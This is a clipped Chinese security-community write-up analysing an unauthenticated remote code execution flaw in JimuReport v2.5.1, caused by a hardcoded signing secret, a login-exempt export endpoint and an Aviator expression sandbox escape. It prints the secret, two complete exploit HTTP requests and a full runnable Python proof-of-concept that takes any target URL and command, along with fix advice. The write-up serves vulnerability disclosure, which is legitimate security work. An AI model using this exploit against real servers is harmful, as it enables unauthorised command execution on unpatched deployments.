---
title: 【先知】JeecgBoot JimuReport v2.5.1 未授权 RCE 漏洞分析与 Aviator 沙箱逃逸
source: https://xz.aliyun.com/news/92789
source_host: xz.aliyun.com
clip_date: 2026-09-11T14:13:06+08:00
trace_id: ad8dadd7-bce1-4111-b3c6-4845237809d5
content_hash: 2d40bac38bac825b1a2ead1b7a495e4d63877140f6608e16d96b376024592c17
status: synced
tags:
  - 先知
  - 漏洞分析
  - 表达式注入
series: null
feed_source: 先知安全技术社区
ai_summary: JimuReport v2.5.1 的自动导出接口签名密钥硬编码、接口免登录，用户参数被送入 Aviator 求值，可未授权执行任意命令。
ai_summary_style: key-points
images_status:
  total: 3
  succeeded: 3
  failed_urls: []
notion_page_id: 3d875244-d011-8142-9477-dd42c78d285f
ioc:
  cves: []
  cwes:
    - CWE-306
    - CWE-798
    - CWE-94
  hashes:
    - 0c46248431632ca04f0098c6b9dd11e2
    - 4aecf57779f94731ef7a0ada7520edf8
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> JimuReport v2.5.1 的自动导出接口签名密钥硬编码、接口免登录，用户参数被送入 Aviator 求值，可未授权执行任意命令。
> 
> - **未授权入口：** `POST /jmreport/auto/export/python/plugin` 同时标注 `@JimuSignature` 与 `@JimuNoLoginRequired`，而签名密钥 `PRINT_PLUGIN_SIGN_SECRET` 硬编码在客户端依赖中，任何人可伪造 `X-Sign = MD5(body + 密钥).upper()` 通过校验。
> - **注入链路：** autoExport → exportMore → getBaseSql 中把 queryParam 值传给 `ExpressUtil.a(value, null)`，凡以 `=` 开头的值即被 Aviator `compile().execute()` 当作表达式执行。
> - **沙箱逃逸：** 引擎虽禁用 NewInstance/Use/Module/StaticMethods/StaticFields 并清空 ALLOWED_CLASS_SET，但仍暴露 `__instance__`、`__env__`、`seq` 与 InternalVars，可借 for 循环改写 features 并把 functionMissing 换成 JavaMethodReflectionFunctionMissing，从而恢复反射能力。
> - **利用效果：** 先发一条逃逸表达式持久化改写引擎，再发 `Runtime.getRuntime().exec(cmd)`；两次请求均返回 HTTP 200 且响应为 ZIP 魔数，实测落盘文件内容为 JimuReport_PWNED。
> - **定级与修复：** CVSS 3.1 为 9.8、CVSS 4.0 为 9.3，官方暂无修复版本；建议去掉硬编码密钥改用服务端配置、移除免登录、禁止对用户参数做动态表达式求值并升级 Aviator。

## 1\. 产品介绍（Product Introduction）

JimuReport（积木报表）是 JeecgBoot 团队推出的一款基于低代码技术的智能报表平台，提供灵活的数据可视化设计、多数据源连接、动态模板生成、参数化配置、复杂计算公式、数据权限控制及多格式导出等功能，支持快速构建可配置的业务报表与分析场景。该产品通过 `jimureport-spring-boot-starter` 系列依赖被大量 Spring Boot 业务系统集成，广泛部署于政务、金融、企业信息化等场景，且报表服务默认对外提供 HTTP 接口。本次漏洞位于其自动导出（auto export）功能模块的 `/jmreport/auto/export/python/plugin` 接口及其底层表达式解析引擎（Aviator）。

* * *

## 2\. 漏洞标题（Vulnerability Title）

JeecgBoot JimuReport v2.5.1 存在未授权远程命令执行漏洞（pre-auth RCE，Aviator 沙箱逃逸）

* * *

## 3\. 漏洞描述（Description）

JimuReport v2.5.1 的自动导出接口 `POST /jmreport/auto/export/python/plugin` 同时标注了 `@JimuNoLoginRequired` （无需登录）与 `@JimuSignature` （需要签名），但其签名密钥 `PRINT_PLUGIN_SIGN_SECRET` 为 **硬编码** 常量，任何人都可伪造 `X-Sign = MD5(请求体 + 密钥)` 通过签名校验，从而在 **无需任何认证** 的情况下触达该接口。该接口将请求体 `reportParams[].params` 中的查询参数值透传至 `ExpressUtil.a(value, null)` ，交给 Aviator 表达式引擎执行其中以 `=` 开头的表达式。Aviator 引擎虽关闭了部分反射特性（NewInstance/Use/Module/StaticMethods/StaticFields，并清空 ALLOWED_CLASS_SET），但仍暴露内置变量 `__instance__` 、 `__env__` 与 `seq` ，攻击者据此可将引擎的 `functionMissing` 替换为 `JavaMethodReflectionFunctionMissing` 并重新启用反射 Feature，从而绕过沙箱，最终通过 `Runtime.getRuntime().exec(...)` 在服务器上执行任意系统命令，导致机密性、完整性、可用性全部受损（完整远程代码执行）。

* * *

## 4\. 漏洞分析（Analysis / 根因定位）

**根因类型**：CWE-94（代码注入 / 表达式注入），辅助成因 CWE-798（硬编码凭据）、CWE-306（关键功能缺少鉴权）。

**数据流 / 触发路径**：

```plain
攻击者构造 JSON 请求体 reportParams[].params.p = "=<Aviator 表达式>"
  → POST /jmreport/auto/export/python/plugin  (@JimuSignature + @JimuNoLoginRequired)
  → JimuReportSignatureInterceptor.preHandle  (X-Sign = MD5(body + 硬编码密钥) 可伪造 → 通过)
  → JimuReportTokenInterceptor  (@JimuNoLoginRequired → 跳过登录)
  → IJimuReportAutoService.autoExport(vo)
  → autoAsyncTasks.a(vo)  (同步导出)
  → IJmReportExportService.exportMore(exportParams, ...)
  → JmReportBaseServiceImpl.getBaseSql(jmReportDb, paramJson, sqlParamsMap, dbParamType)
  → for (key : queryJson.keySet())  value = ExpressUtil.a(value, null)   ← 危险函数（eval）
  → AviatorEvaluatorInstance.compile(expression).execute(env)  ← 表达式引擎执行
  → 沙箱逃逸 → JavaMethodReflectionFunctionMissing → Runtime.getRuntime().exec(cmd)
```

**代码定位（反编译自** `jimureport-spring-boot4-starter-2.5.1.jar` **）**：

```latex
文件：org/jeecg/modules/jmreport/common/interceptor/JimuReportSignatureInterceptor.java
行号：50  （硬编码密钥）
关键代码：
    private static final String PRINT_PLUGIN_SIGN_SECRET = "6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121";
    ...
    // 第 72~80 行：针对 /auto/export/python/plugin 直接用该硬编码密钥校验签名
    if (requestUri.endsWith("/auto/export/python/plugin")) {
        String body = requestWrapper.getBody();
        String signValue = DigestUtils.md5DigestAsHex((body + PRINT_PLUGIN_SIGN_SECRET).getBytes("UTF-8")).toUpperCase();
        if (!signValue.equals(headerSign)) { ... return false; }
        return true;
    }
```

```latex
文件：org/jeecg/modules/jmreport/automate/b/a.java  （控制器，混淆后类名）
行号：74~83  （/export/python/plugin 映射）
关键代码：
    @JimuSignature
    @JimuNoLoginRequired
    @RequestMapping(value={"/export/python/plugin"}, method={RequestMethod.POST})
    public Result<?> b(@RequestBody JimuReportAutoExportVO jimuReportAutoExportVO) {
        ...
        return this.jimuReportAutoService.autoExport(jimuReportAutoExportVO);
    }
```

```latex
文件：org/jeecg/modules/jmreport/desreport/service/a/g.java  （getBaseSql）
行号：3362~3367  （RCE 汇聚点）
关键代码：
    for (String key : queryJson.keySet()) {
        String value = queryJson.getString(key);
        if (OkConvertUtils.isEmpty(value)) value = "";
        value = ExpressUtil.a(value, null);   // ← 用户可控值进入表达式引擎
        paramMap.put(key, value);
        ...
    }
```

```latex
文件：org/jeecg/modules/jmreport/desreport/express/ExpressUtil.java
行号：591~610  （eval 实现）
关键代码：
    public static String a(String expression, Map<String,Object> systemParam) {
        ...
        if ((expression = expression.trim()).startsWith("=")) {
            String temp = expression.replace("=", "");
            ...
            Expression exp = i.compile(temp, true);
            Object object = exp.execute(new HashMap(5));   // ← Aviator eval
            return object.toString();
        }
        ...
    }
```

**成因分析**：

1.  **签名形同虚设（CWE-798）**： `/auto/export/python/plugin` 走“打印插件导出”专用分支，其签名密钥 `PRINT_PLUGIN_SIGN_SECRET` 直接硬编码在客户端依赖中，与服务端配置项 `jeecg.jmreport.signatureSecret` 无关。由于密钥对所有人公开， `X-Sign` 可被任意伪造， `@JimuSignature` 无法提供任何防护。
2.  **接口未鉴权（CWE-306）**：该接口被 `@JimuNoLoginRequired` 标注，配合可伪造的签名，实际形成完全未授权的访问入口。
3.  **表达式注入（CWE-94，根因）**： `getBaseSql` 把用户可控的 queryParam 值直接传入 `ExpressUtil.a` 并用 Aviator 动态执行。 `ExpressUtil.a(engine)` 虽移除了 `NewInstance` / `Use` / `Module` / `StaticMethods` / `StaticFields` 并清空 `ALLOWED_CLASS_SET` ，但 **保留了 Aviator 的** `InternalVars` **Feature**，使表达式得以读取 `__instance__` （引擎实例）与 `__env__` （执行环境）这两个内部变量；再配合始终可用的内置 `seq` 函数与已启用的 `ForLoop` （对 `__instance__.features` 遍历取值），即可直接改写引擎的 `features` （重新加入 `StaticMethods` / `Fn` ）与 `functionMissing` （替换为 `JavaMethodReflectionFunctionMissing` ），导致沙箱被结构性绕过。

* * *

## 5\. 影响版本（Affected Versions）

-   **受影响版本**：v2.5.1（Maven 依赖 `org.jeecgframework.jimureport:jimureport-spring-boot4-starter:2.5.1` ）及可能更早版本（该硬编码密钥与 `ExpressUtil` 动态表达式执行在更早版本即存在）。
-   **不受影响版本**：截至报告日期暂无确认的不受影响版本。
-   **修复版本**：截至报告日期（2026-09-06）官方仓库最新提交未见修复，暂无修复版本。
-   **验证环境**：JimuReport v2.5.1（git commit `414017d` ）/ Windows 11 / Spring Boot 4.1.0 / JDK 21 / MySQL 8.0.12 / Redis 5.0.14。

* * *

## 6\. 漏洞等级（Severity）

|     |     |
| --- | --- | 
| 项目  | 值   |
| CVSS v3.1 分数 | 9.8 |
| CVSS v3.1 向量 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| CVSS v4.0 分数 | 9.3 |
| CVSS v4.0 向量 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| 危害等级 | 严重（Critical） |
| 对应目标库等级 | CNVD 高危 / CNNVD 高危 |

> 评分依据：无需认证（PR:N）、网络可达（AV:N）、无需用户交互（UI:N）、攻击复杂度低（AC:L）、可直接远程执行任意命令（C/I/A 全 High）。

* * *

## 7\. CVSS 向量（CVSS Vector）

```plain
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
```

* * *

## 8\. 漏洞复现过程（Reproduction Steps）

### 8.1 复现环境

-   产品/版本：JimuReport v2.5.1（ `jimureport-example` ，依赖 `jimureport-spring-boot4-starter:2.5.1` ）
-   系统/运行时：Windows 11 / JDK 21 / Spring Boot 4.1.0 / MySQL 8.0.12 / Redis 5.0.14
-   网络位置：本地自建靶标 `http://127.0.0.1:8090`
-   测试账号：无（未登录，未携带任何 Token）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6f70a255c5549df7.png)

`<font style="color:rgb(8, 8, 8);background-color:rgba(212, 222, 231, 0.247);">默认账号密码：admin / 123456，</font>[<font style="color:rgb(49, 95, 189);">支持改密码</font>](https://help.jimureport.com/qa?_highlight=%E5%AF%86%E7%A0%81#4-jimureport-example%E9%A1%B9%E7%9B%AE%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81)`

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d085a247e1e07bc5.png)

### 8.2 复现步骤

**步骤 1 — 环境准备**

切换到 v2.5.1 版本源码并启动项目：

```bash
git checkout -b v2.5.1 414017d   # v2.5.1 版本发布提交
# 导入数据库：db/jimureport.mysql5.7.create.sql -> 库名 jimureport
# 修改 application-dev.yml: 端口 8090、MySQL 密码、开启 automate.export.enable-auto-export=true
mvn -DskipTests package
java -jar jimureport-example-2.5.jar
```

启动日志： `Started JimuReportApplication in 13.085 seconds` ， `Tomcat started on port 8090` ，HikariPool 成功连接 MySQL。

> 证据：应用启动成功、MySQL 数据源连通；未登录状态直接访问接口可返回导出结果。

**步骤 2 — 构造恶意请求（STEP1 沙箱逃逸）**

利用硬编码密钥 `6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121` 伪造签名 `X-Sign = MD5(body + secret).upper()` ：

```http
POST /jmreport/auto/export/python/plugin HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/json
X-Timestamp: 1788705518570
X-Sign: 4AECF57779F94731EF7A0ADA7520EDF8
User-Agent: poc/1.0

{"reportParams":[{"id":"891612623430320128","params":{"p":"=for x in __instance__.features { seq.put(__instance__.funcMap, '_sm', x.declaringClass.enumConstants[16]); seq.put(__instance__.funcMap, '_fn', x.declaringClass.enumConstants[8]) }; seq.add(__instance__.features, seq.get(__instance__.funcMap, '_sm')); seq.add(__instance__.features, seq.get(__instance__.funcMap, '_fn')); seq.put(__env__, 'c', __instance__.Class); seq.put(__env__, 'CC', c.Class); seq.put(__env__, 'FM', CC.forName('com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing')); seq.put(__env__, 'RF', CC.forName('com.googlecode.aviator.utils.Reflector')); RF.setProperty(__env__, '__instance__.functionMissing', FM.getInstance()) * 1*4831927"},"exportType":"PDF"}],"exportType":"PDF"}
```

**步骤 3 — 触发漏洞 / 观察结果（STEP2 命令执行）**

```http
POST /jmreport/auto/export/python/plugin HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/json
X-Timestamp: 1788705524387
X-Sign: 0C46248431632CA04F0098C6B9DD11E2
User-Agent: poc/1.0

{"reportParams":[{"id":"891612623430320128","params":{"p":"=seq.put(__env__, 'c', __instance__.Class); seq.put(__env__, 'CC', c.Class); seq.put(__env__, 'RT', CC.forName('java.lang.Runtime')); seq.put(__env__, 'r', RT.getRuntime()); exec(seq.get(__env__, 'r'), 'cmd.exe /c echo JimuReport_PWNED > F:/data/github/JimuReport/vuln-reproduction/pwned.txt') * 1*4831927"},"exportType":"PDF"}],"exportType":"PDF"}
```

两次请求均返回 `HTTP 200` ， `Content-Type: application/octet-stream;charset=UTF-8` ，响应体以 `PK\x03\x04` （ZIP）开头，说明伪造签名被接受、接口未鉴权、导出流程（含 eval）被执行。

**步骤 4 — 影响验证**

```latex
$ cat F:/data/github/JimuReport/vuln-reproduction/pwned.txt
JimuReport_PWNED
```

命令 `cmd.exe /c echo JimuReport_PWNED > ...` 已在服务器上真实执行并落盘，证明完整的未授权远程命令执行成立。

> 证据：
> 
> -   HTTP 200 + `application/octet-stream` + `PK` 魔数（两次请求响应）
> -   `pwned.txt` 文件生成，内容 `JimuReport_PWNED`
> -   应用日志 `JimuReportTokenServiceImpl` 记录 `RequestPath=/jmreport/auto/export/python/plugin` ， `Token=null` （未登录即处理）

* * *

## 9\. 漏洞复现 POC（Proof of Concept）

### 9.1 使用说明

-   运行环境：Python 3（独立脚本 `reproduce_rce.py` ）、pocsuite3 插件、Nuclei 模板
-   依赖：标准库 `urllib` （无需第三方库）；pocsuite3 插件需 pocsuite3
-   安全声明：本 POC 仅用于授权测试与漏洞验证，禁止用于未授权系统；默认命令为非破坏性的文件写入/ `whoami` ，不包含反弹 shell、勒索、持久化或横向移动逻辑。

### 9.2 POC 代码（核心片段）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JimuReport 2.5.1  pre-auth RCE 复现脚本（本机验证版）
========================================================================
漏洞链: POST /jmreport/auto/export/python/plugin  (@JimuSignature + @JimuNoLoginRequired)
        -> JimuReportAutoService.autoExport -> autoAsyncTasks(同步) -> exportMore
        -> getBaseSql -> ExpressUtil.a(queryParam 值) -> Aviator eval -> 沙箱逃逸 -> Runtime.exec

签名: X-Sign = MD5(原始请求体 + PRINT_PLUGIN_SIGN_SECRET).upper()
      内置硬编码密钥 PRINT_PLUGIN_SIGN_SECRET = 6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121

用法:
  python reproduce_rce.py <target> "<command>"
  例(写文件验证): python reproduce_rce.py http://127.0.0.1:8090 "cmd.exe /c echo PWNED > F:/data/github/JimuReport/vuln-reproduction/pwned.txt"
  例(弹计算器):   python reproduce_rce.py http://127.0.0.1:8090 "cmd.exe /c calc.exe"
"""
import hashlib
import json
import sys
import time
import random
import urllib.request
import urllib.error

SECRET = "6fea20a1940df21797d89f09c9111d56c1fe1fcfbe41a121"
ENDPOINT = "/jmreport/auto/export/python/plugin"
DEFAULT_REPORT_ID = "891612623430320128"

def build_step1_body(report_id: str) -> str:
    """STEP1 沙箱逃逸(持久化): 把 Aviator 引擎的 functionMissing 替换为
    JavaMethodReflectionFunctionMissing, 并重新启用反射相关 Feature。"""
    expr = (
        "=for x in __instance__.features { "
        "seq.put(__instance__.funcMap, '_sm', x.declaringClass.enumConstants[16]); "
        "seq.put(__instance__.funcMap, '_fn', x.declaringClass.enumConstants[8]) }; "
        "seq.add(__instance__.features, seq.get(__instance__.funcMap, '_sm')); "
        "seq.add(__instance__.features, seq.get(__instance__.funcMap, '_fn')); "
        "seq.put(__env__, 'c', __instance__.Class); "
        "seq.put(__env__, 'CC', c.Class); "
        "seq.put(__env__, 'FM', CC.forName('com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing')); "
        "seq.put(__env__, 'RF', CC.forName('com.googlecode.aviator.utils.Reflector')); "
        "RF.setProperty(__env__, '__instance__.functionMissing', FM.getInstance()) * 1*%d"
    ) % (int(time.time() * 1000) % 1000000,)
    return json.dumps(
        {"reportParams": [{"id": report_id, "params": {"p": expr}, "exportType": "PDF"}],
         "exportType": "PDF"},
        separators=(",", ":"), ensure_ascii=False)

def build_step2_body(cmd: str, report_id: str) -> str:
    """STEP2 命令执行: exec(r, cmd) -> Runtime.exec(String)。"""
    safe_cmd = cmd.replace("\\", "\\\\").replace("'", "\\'")
    expr = (
        "=seq.put(__env__, 'c', __instance__.Class); "
        "seq.put(__env__, 'CC', c.Class); "
        "seq.put(__env__, 'RT', CC.forName('java.lang.Runtime')); "
        "seq.put(__env__, 'r', RT.getRuntime()); "
        "exec(seq.get(__env__, 'r'), '%s') * 1*%d"
    ) % (safe_cmd, random.getrandbits(24))
    return json.dumps(
        {"reportParams": [{"id": report_id, "params": {"p": expr}, "exportType": "PDF"}],
         "exportType": "PDF"},
        separators=(",", ":"), ensure_ascii=False)

def send(target: str, body: str, tag: str) -> None:
    ts = str(int(time.time() * 1000))
    sign = hashlib.md5((body + SECRET).encode()).hexdigest().upper()
    req = urllib.request.Request(
        target + ENDPOINT,
        data=body.encode("utf-8"),
        headers={
            "Content-Type": "application/json",
            "X-Timestamp": ts,
            "X-Sign": sign,
            "User-Agent": "poc/1.0",
        },
        method="POST",
    )
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    print("=" * 72)
    print("[%s] POST %s%s" % (tag, target, ENDPOINT))
    print("X-Timestamp: %s" % ts)
    print("X-Sign    : %s" % sign)
    print("Body(%d): %s%s" % (len(body), body[:140], "..." if len(body) > 140 else ""))
    try:
        with opener.open(req, timeout=40) as resp:
            data = resp.read()
            ctype = resp.headers.get("Content-Type", "")
            print("HTTP %s | %s | %d bytes" % (resp.status, ctype, len(data)))
            if "json" in ctype or "text" in ctype:
                print("Resp: %s" % data.decode("utf-8", errors="replace")[:400])
            else:
                print("Resp: (binary %d bytes, magic=%s)" % (len(data), data[:4].hex()))
    except urllib.error.HTTPError as e:
        data = e.read().decode("utf-8", errors="replace")
        print("HTTP %s" % e.code)
        print("Resp: %s" % data[:400])
    except Exception as e:
        print("ERR : %s" % e)

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        sys.exit(1)
    target = args[0].rstrip("/")
    cmd = args[1] if len(args) > 1 else "cmd.exe /c calc.exe"
    report_id = DEFAULT_REPORT_ID

    print("Target : %s" % target)
    print("Command: %s" % cmd)
    print("ReportID: %s" % report_id)
    print()

    print("[*] STEP 1: 沙箱逃逸 (持久化在 JVM 内, 幂等)")
    send(target, build_step1_body(report_id), "STEP1")
    print()
    time.sleep(1)

    print("[*] STEP 2: 命令执行 Runtime.exec(String)")
    send(target, build_step2_body(cmd, report_id), "STEP2")
    print()
    print("[*] done. HTTP 200/500 均可能, 以命令副作用为准(写盘文件/弹窗/带外)。")

if __name__ == "__main__":
    main()
```

完整可运行脚本见 `poc/reproduce_rce.py` （独立版）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/002e130cef322b17.png)

* * *

## 10\. 修复建议（Fix Recommendations）

### 10.1 临时缓解措施

-   在 WAF/网关层对 `/jmreport/auto/export/**` 实施访问控制（IP 白名单 / 仅内网可达）。
-   若业务不使用“打印插件导出”，临时下线或屏蔽 `/jmreport/auto/export/python/plugin` 与 `/jmreport/auto/export/plugin` 接口。
-   关闭 `jeecg.jmreport.automate.export.enable-auto-export` ，阻止自动导出链路。

### 10.2 根治修复方案

1.  **去除硬编码密钥**： `JimuReportSignatureInterceptor` 中 `/auto/export/python/plugin` 分支不得使用硬编码的 `PRINT_PLUGIN_SIGN_SECRET` ，应统一改为读取服务端配置 `jeecg.jmreport.signatureSecret` ，并强制要求部署方替换默认值、在启动时校验密钥非空非默认。
2.  **补强鉴权**：移除该接口的 `@JimuNoLoginRequired` ，或在 `@JimuSignature` 之外叠加真实会话鉴权；签名只能作为防重放的辅助手段，不能作为唯一访问控制。
3.  **收敛表达式执行面（根因）**： `getBaseSql` 中不要对用户可控的 queryParam 值调用 `ExpressUtil.a` 做动态求值；若确需计算，应：

-   仅允许白名单函数与常量字面量，禁止 `__instance__` / `__env__` / `seq` /反射/ `Class.forName` 等逃逸原语；
-   用独立的、更严格的 Aviator 实例（关闭 `seq` 与 `InternalVars` 等），或在执行前对表达式做 AST 级黑白名单校验；
-   更彻底地，将参数求值放到服务端可信上下文中，杜绝“用户输入即代码”。

1.  **升级 Aviator 并关注其安全公告**：关注 `com.googlecode.aviator` 沙箱逃逸相关修复，及时升级依赖。

### 10.3 修复验证

重放原始 POC：伪造签名的请求应被拒绝（返回签名校验失败），且即使签名正确，含 `__instance__` / `Class.forName` / `Runtime` 等逃逸原语的表达式应被表达式引擎拒绝执行，命令不再产生副作用。

* * *

## 参考链接：

[https://github.com/jeecgboot/JimuReport](https://github.com/jeecgboot/JimuReport)
